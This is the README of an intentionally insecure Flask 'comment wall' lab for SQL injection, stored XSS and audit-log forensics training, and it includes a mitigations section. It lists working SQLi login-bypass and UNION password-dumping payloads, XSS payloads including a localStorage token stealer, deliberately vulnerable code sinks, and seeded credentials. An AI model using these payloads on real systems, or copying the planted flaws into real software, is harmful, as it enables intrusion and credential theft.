# Vulnerable Comment Wall — SQLi / XSS Training Lab

> ⚠️ **Intentionally insecure.** Localhost only. Never expose this app to a
> network you don't own. Every endpoint contains deliberate vulnerabilities.

A small, standalone web app built as a hands-on lab for SQL injection,
stored XSS, plaintext password storage, and audit-log forensics. Same
category as DVWA / OWASP Juice Shop / WebGoat, but lighter — under 350 lines
of Python plus a vanilla-JS single-page frontend — and aimed at a single
60–90 minute training session.

---

## Contents

1. [What the app does](#1-what-the-app-does)
2. [How it works (architecture)](#2-how-it-works-architecture)
3. [Vulnerabilities](#3-vulnerabilities)
4. [Audit logging](#4-audit-logging)
5. [Deploying on another machine](#5-deploying-on-another-machine)
6. [Running a training session](#6-running-a-training-session)
7. [File layout](#7-file-layout)
8. [Mitigations to discuss after the demo](#8-mitigations-to-discuss-after-the-demo)

---

## 1. What the app does

A public "comment wall" — a Twitter-lite — with three user-facing features:

| Feature              | Endpoint                       | Notes |
|----------------------|--------------------------------|-------|
| Register an account  | `POST /api/register`           | Username + password, no email/verification. |
| Sign in              | `POST /api/login`              | Returns a "token" (which is just the username string — see vuln #1). |
| List comments        | `GET  /api/comments`           | Newest-first, public, no pagination. |
| Search comments      | `GET  /api/comments?q=...`     | Substring `LIKE` search. |
| Post a comment       | `POST /api/comments`           | Requires the login token; body is stored verbatim. |

The comment wall is a single page (SPA) with two states: signed-out (login /
register form visible) and signed-in (post + search + comment list visible).
Below every form there is a **debug box** that prints the actual SQL the
server executed for that request — it's there so trainees can confirm
exactly *why* a payload worked.

Three users are pre-seeded on first run:

| user  | password       | role  |
|-------|----------------|-------|
| alice | password123    | user  |
| bob   | hunter2        | user  |
| admin | S3cretAdmin!   | admin |

---

## 2. How it works (architecture)

```
                  ┌──────────────────────────────────────┐
   Browser  ───►  │  Flask (app.py, port 5050)           │  ───► access.log (logfmt)
   (SPA)    ◄───  │  ├─ static/index.html, app.js, css   │       (also stdout)
                  │  ├─ /api/login, /api/register        │
                  │  ├─ /api/comments  (GET + POST)      │
                  │  └─ vuln.db (SQLite, file)           │
                  └──────────────────────────────────────┘
```

### Backend — `app.py`

- **Framework:** Flask 3.x with three real routes (`/`, the four `/api/*`
  endpoints, and Flask's built-in static handler for `app.js` / `style.css`).
- **Database:** SQLite, single file (`vuln.db`) created and seeded on first
  run by `init_db()`. Two tables — `users` (id, username, password,
  is_admin) and `comments` (id, username, body, created_at).
- **"Sessions":** none. Login returns the username as a `token`; the SPA
  stashes it in `localStorage` and sends it back in the JSON body of
  `POST /api/comments`. This is deliberately weak — clients can mint their
  own tokens, and a stored XSS payload reads `localStorage` directly.
- **Vulnerable SQL is built by f-string concatenation**; safe SQL uses
  parameterised `?` placeholders. Both styles sit side-by-side in the
  source so trainees can compare them.
- **Logging:** custom logfmt formatter (`log_event(...)`) writing to a
  `RotatingFileHandler` (2 MB × 3 backups, default `access.log`) and stdout.

### Frontend — `static/`

- `index.html` — markup for both UI states.
- `app.js` — vanilla JS. Uses `fetch()` for the four API calls and renders
  comments via `innerHTML` (deliberately, see vuln #3). Username and
  timestamp **are** escaped with a small `escapeText()` helper; comment
  body is **not** escaped.
- `style.css` — dark theme, no framework.

### Request flow for a login

1. SPA `POST`s `{username, password}` JSON to `/api/login`.
2. `login()` builds `SELECT ... FROM users WHERE username='X' AND password='Y'`
   by f-string interpolation and runs it.
3. If a row comes back, the response includes `token` (the username), the
   admin flag, and the executed SQL (so the debug box can show it).
4. SPA stores the token in `localStorage` and switches to the signed-in UI.
5. Server emits a `login_success` (or `login_failure`) audit-log line.

### Request flow for a comment

1. SPA `POST`s `{token, body}` JSON to `/api/comments`.
2. Server uses a **parameterised** insert (registration and post are *not*
   the SQLi sinks) and commits.
3. SPA reloads the comment list; each `<li>` body is set with `innerHTML`,
   so any markup/JS in the body executes for every viewer.
4. Server emits a `comment_posted` line with a 120-char body preview and an
   `xss_suspected` heuristic flag.

---

## 3. Vulnerabilities

Every vuln is wired in on purpose — the source code carries `# VULNERABLE:`
comments at each sink. The debug box under each form prints the executed
SQL so trainees can correlate payload → query → result.

### 3.1 SQL Injection — login bypass (`/api/login`)

**Sink** — `app.py`, `login()`:

```python
query = (
    "SELECT id, username, is_admin FROM users "
    f"WHERE username = '{username}' AND password = '{password}'"
)
db.execute(query).fetchone()
```

**Payloads** (paste into the Username field, password can be anything):

| payload                              | effect                                              |
|--------------------------------------|-----------------------------------------------------|
| `' OR '1'='1' --`                    | Logs in as the first row of `users` (alice).        |
| `admin' --`                          | Logs in as **admin** without their password.        |
| `' UNION SELECT 1, 'pwned', 1 --`    | Logs in as a fabricated admin user named `pwned`.   |

**Why it works:** the username string is concatenated unescaped into the
SQL. The `--` comments out the rest of the query, including the
password check.

**Audit log signature:** `event=login_success sqli_suspected=true
attempted_user="admin' --" user=admin admin=true`. The `sqli_suspected`
flag is set whenever the username row that came back doesn't match the
username sent.

### 3.2 SQL Injection — UNION-based extraction (`/api/comments?q=...`)

**Sink** — `app.py`, `list_comments()`:

```python
query = (
    "SELECT id, username, body, created_at FROM comments "
    f"WHERE body LIKE '%{search}%' ORDER BY id DESC"
)
db.execute(query).fetchall()
```

**Payloads** (type into the search box):

| payload                                                                     | effect                                                |
|-----------------------------------------------------------------------------|-------------------------------------------------------|
| `%' UNION SELECT id, username, password, '' FROM users--`                   | Dumps every plaintext password as a "comment body".   |
| `%' UNION SELECT 1, name, sql, '' FROM sqlite_master--`                     | Enumerates tables and their `CREATE TABLE` DDL.       |
| `%' UNION SELECT 1, sqlite_version(), 'fingerprint', ''--`                  | DB version fingerprint.                               |

**Why it works:** the `LIKE` clause closes early on the first `%'`, then a
`UNION SELECT` adds rows from any table to the same result set. The four
columns must match the four columns the page renders.

**Audit log signature:** `event=comment_search sqli_suspected=true q="%' UNION ..."`.

### 3.3 Stored XSS — comment body

**Sink** — `static/app.js`:

```js
li.innerHTML = `
    <div class="meta"><b>${escapeText(c.username)}</b>
      <span class="ts">${escapeText(c.created_at || "")}</span></div>
    <div class="body">${c.body}</div>`;       // ← body NOT escaped
```

**Payloads** (post as a comment while signed in):

| payload                                                                              | effect                                  |
|--------------------------------------------------------------------------------------|-----------------------------------------|
| `<img src=x onerror="alert('XSS by '+document.domain)">`                             | Pop-up alert when *any* user views.     |
| `<script>fetch('http://127.0.0.1:5050/?stolen='+localStorage.getItem('token'))</script>` | Exfiltrates the auth token over HTTP.   |
| `<style>body{background:red}</style><h1>pwned</h1>`                                  | DOM defacement / phishing pretext.      |

**Why it works:** the server stores the body verbatim, and the SPA renders
it with `innerHTML`. Every visitor that loads the wall executes whatever
HTML/JS the attacker stashed in a comment — classic stored XSS.

**Audit log signature:** `event=comment_posted xss_suspected=true
body_preview="<img src=x onerror=alert(1)>"`.

### 3.4 Plaintext password storage

Passwords are inserted unmodified into `users.password`:

```python
db.execute("INSERT INTO users (username, password) VALUES (?, ?)",
           (username, password))
```

Combined with vuln 3.2, an attacker drops every password into the
comment list with one search-box payload. There's no hashing, no salting,
and no peppering.

### 3.5 Bonus weaknesses (not headlined, but worth pointing out)

- **Authentication state lives entirely client-side.** The "token" is just
  the username — clients can forge it. Try editing `localStorage.token` to
  `admin` in DevTools.
- **No CSRF protection.** Comments are accepted on a JSON POST with no
  origin or token check.
- **Verbose error responses.** SQL errors and the executed query are
  returned to the client (great for the demo, terrible in production).
- **No CSP, no `X-Frame-Options`, no `Referrer-Policy`.**

---

## 4. Audit logging

Every API call writes a single-line **logfmt** record to `access.log`
(rotating, 2 MB × 3 backups) and to stdout. Override the path with
`VULN_DEMO_LOG=/path/to/file.log python app.py`.

Format — key=value pairs, values containing whitespace or quotes are
themselves quoted, booleans are lowercase:

```
ts=2026-04-27T10:36:11.123456Z level=info event=login_success ip=127.0.0.1 method=POST path=/api/login ua="Mozilla/5.0..." user=admin attempted_user="admin' --" admin=true sqli_suspected=true sql="SELECT id, username, is_admin FROM users WHERE username = 'admin' --' AND password = 'anything'"
```

### Events emitted

| event                     | level   | extra fields                                                  |
|---------------------------|---------|---------------------------------------------------------------|
| `login_success`           | info    | `user`, `attempted_user`, `admin`, `sqli_suspected`, `sql`    |
| `login_failure`           | warning | `user`, `sql`                                                 |
| `login_sql_error`         | warning | `user`, `err`, `sql`                                          |
| `register_success`        | info    | `user`                                                        |
| `register_failure`        | warning | `user`, `reason` (`missing_fields` / `duplicate`)             |
| `comment_list`            | info    | `results`                                                     |
| `comment_search`          | info    | `q`, `results`, `sqli_suspected`, `sql`                       |
| `comment_search_sql_error`| warning | `q`, `err`, `sql`                                             |
| `comment_posted`          | info    | `user`, `body_len`, `body_preview`, `xss_suspected`           |
| `comment_post_failure`    | warning | `reason` (`no_token` / `empty_body`), `user`                  |

Every record carries `ts` (UTC ISO8601), `level`, `ip` (honours
`X-Forwarded-For`), `method`, `path`, `ua`. `sqli_suspected` and
`xss_suspected` are crude heuristics (presence of `union`, `--`, `<script`,
`onerror=`, etc.) — useful for trainees to verify their attack landed in
the audit trail.

> Passwords are deliberately **not** logged — only usernames (which double
> as the SQLi vector) and the executed SQL appear in the trail.

### Bash parsing

A worked example lives in `parse_logs.sh`:

```
./parse_logs.sh                # uses ./access.log
./parse_logs.sh /var/log/x.log
```

It produces an event-count summary, login-failure list, SQLi/XSS-flagged
events, and top source IPs. One-liners for ad-hoc digging:

```bash
# count login failures by IP
grep 'event=login_failure' access.log | grep -oE 'ip=[^ ]+' | sort | uniq -c | sort -rn

# show every SQLi-suspected login attempt
grep 'event=login_success' access.log | grep 'sqli_suspected=true'

# pull all attempted XSS payloads
grep 'event=comment_posted' access.log | grep 'xss_suspected=true' \
  | sed -E 's/.* body_preview=("[^"]*"|[^ ]+).*/\1/'
```

---

## 5. Deploying on another machine

The whole lab fits in one folder, has one runtime dependency (Flask), and
binds to `127.0.0.1` only. No Docker, no DB server, no build step.

### 5.1 Prerequisites

- **Python 3.10+** (3.11 / 3.12 / 3.13 all tested)
- **pip** + **venv** (both ship with Python on most distros and macOS)
- A modern browser (Chrome, Firefox, Safari, Edge)
- Free TCP port **5050** on localhost
  - Default is **not** 5000, because macOS AirPlay Receiver intercepts
    that port and returns 403s. Change the port at the bottom of `app.py`
    if 5050 is also taken.

### 5.2 Get the files onto the target machine

Copy the entire `vuln-demo/` folder. Any of these works:

```bash
# rsync (preferred for over-the-wire copy)
rsync -av vuln-demo/ user@host:/opt/vuln-demo/

# scp
scp -r vuln-demo user@host:/opt/

# tarball / USB
tar czf vuln-demo.tgz vuln-demo/
# ... move it ...
tar xzf vuln-demo.tgz
```

The folder is fully self-contained — `app.py`, `requirements.txt`,
`README.md`, `parse_logs.sh`, and `static/`. Don't ship `.venv/` or
`vuln.db`; they're regenerated on first run.

### 5.3 Install and run

**macOS / Linux:**

```bash
cd vuln-demo
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python app.py
```

**Windows (PowerShell):**

```powershell
cd vuln-demo
py -m venv .venv
.venv\Scripts\Activate.ps1
pip install -r requirements.txt
python app.py
```

Expected startup output:

```
*** Vulnerable demo app — localhost only ***
    http://127.0.0.1:5050

    Seeded users:
      alice / password123
      bob   / hunter2
      admin / S3cretAdmin!

    Audit log: /path/to/vuln-demo/access.log

 * Serving Flask app 'app'
 * Running on http://127.0.0.1:5050
```

Open <http://127.0.0.1:5050> in a browser. The "Comment Wall" should load
with three seeded comments.

### 5.4 Smoke-test from the command line

```bash
# 200 OK
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:5050/

# legit login
curl -s -X POST http://127.0.0.1:5050/api/login \
  -H 'content-type: application/json' \
  -d '{"username":"alice","password":"password123"}'

# SQLi auth bypass
curl -s -X POST http://127.0.0.1:5050/api/login \
  -H 'content-type: application/json' \
  -d "{\"username\":\"admin' --\",\"password\":\"x\"}"
```

Then run `./parse_logs.sh` to confirm the audit log captured both attempts.

### 5.5 Resetting the lab between runs

- **Wipe DB (users + comments):** `rm vuln.db` — recreated on next start.
- **Wipe logs:** `rm access.log access.log.*`
- **Full reset (no virtualenv):** `rm -rf .venv vuln.db access.log*`

### 5.6 Common deployment problems

| Symptom                                          | Fix                                                                                              |
|--------------------------------------------------|--------------------------------------------------------------------------------------------------|
| `403 Forbidden` from `/` on macOS                | Port 5000 is grabbed by AirPlay Receiver. Use port 5050 (the default) or change in `app.py`.     |
| `Address already in use` / `OSError: [Errno 48]` | Another process is on 5050 — `lsof -i :5050` then kill, or pick another port.                    |
| Browser shows old comments after wipe            | Hard-reload (`Cmd/Ctrl-Shift-R`) and clear `localStorage` (DevTools → Application → Storage).    |
| `ModuleNotFoundError: No module named 'flask'`   | The venv isn't active. Re-activate with `source .venv/bin/activate` (or `Activate.ps1`).         |
| Need to expose to a colleague on the same LAN    | **Don't.** This app is intentionally vulnerable. Use a screen-share or set up DVWA in a VM.       |

### 5.7 Optional: run under the included Claude Code preview

If you use Claude Code with the `preview_*` MCP tools, an entry already
exists in `../.claude/launch.json` named `vuln-demo`:

```jsonc
{
  "name": "vuln-demo",
  "runtimeExecutable": "<repo>/vuln-demo/.venv/bin/python",
  "runtimeArgs": ["<repo>/vuln-demo/app.py"],
  "port": 5050
}
```

You can then start it from inside Claude with `preview_start vuln-demo`.

---

## 6. Running a training session

Suggested order (each step takes ~10 minutes with discussion):

1. **Tour the UI.** Sign in as alice, post a benign comment, run a normal
   search. Show that the debug boxes echo the SQL.
2. **SQLi auth bypass** (#3.1). Trainees try `admin' --`. Open the source
   in `app.py:login()` and read the f-string. Open `access.log` and run
   `grep sqli_suspected=true` — show the audit trail.
3. **UNION-based extraction** (#3.2). Trainees dump the password column.
   Tie this to vuln #3.4 (plaintext storage).
4. **Stored XSS** (#3.3). Trainees post `<img src=x onerror=alert(1)>`,
   then a token-stealer using `localStorage`. Discuss persistence vs
   reflected XSS.
5. **Audit log forensics.** Hand them `parse_logs.sh` and the raw log,
   ask them to identify which IPs ran SQLi, what payloads landed, what
   accounts got compromised.
6. **Mitigations.** Walk through the fixes in section 8 and (if there's
   time) hand-edit `app.py` to fix one sink with parameterised SQL — the
   payload that worked five minutes ago now produces a `login_failure`.

---

## 7. File layout

```
vuln-demo/
├── app.py              # Flask backend (vulnerable on purpose)
├── requirements.txt    # Just Flask
├── README.md           # This file
├── parse_logs.sh       # Bash summary of access.log
├── access.log          # Created on first request (gitignore-able)
├── vuln.db             # Created on first run (gitignore-able)
└── static/
    ├── index.html      # SPA shell
    ├── app.js          # Vanilla JS — uses innerHTML on comment bodies
    └── style.css
```

Generated artefacts (`.venv/`, `vuln.db`, `access.log*`) are not tracked
and are regenerated automatically.

---

## 8. Mitigations to discuss after the demo

| Vuln                        | Fix                                                                                  |
|-----------------------------|--------------------------------------------------------------------------------------|
| SQLi (login + search)       | Parameterised queries (`db.execute("... WHERE username = ?", (username,))`).         |
| Stored XSS                  | Render with `textContent`, not `innerHTML`. If HTML is required, sanitise with DOMPurify and apply a strict CSP. |
| Plaintext passwords         | Hash with **argon2id** (preferred) or bcrypt; never store the plaintext.             |
| Username-as-token           | Server-side session: signed cookie, `HttpOnly`, `Secure`, `SameSite=Lax`, short TTL. |
| No CSRF protection          | `SameSite=Lax` cookies + a per-form CSRF token, or rely on the `Origin` header.      |
| Verbose error responses     | Generic 500s for users; detailed error only in server logs.                          |
| Missing security headers    | `Content-Security-Policy: default-src 'self'`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`. |
| Audit-log gaps              | Add response status, request body size, request id, and forward to a SIEM (e.g. via Filebeat → Elasticsearch / Loki). |

---

### Disclaimer

This software is intended for **authorised** security training and is
distributed without any warranty. Running it on a network you don't own,
or against a system you're not authorised to test, may be illegal. The
author and ShieldIQ Cyber accept no liability for misuse.
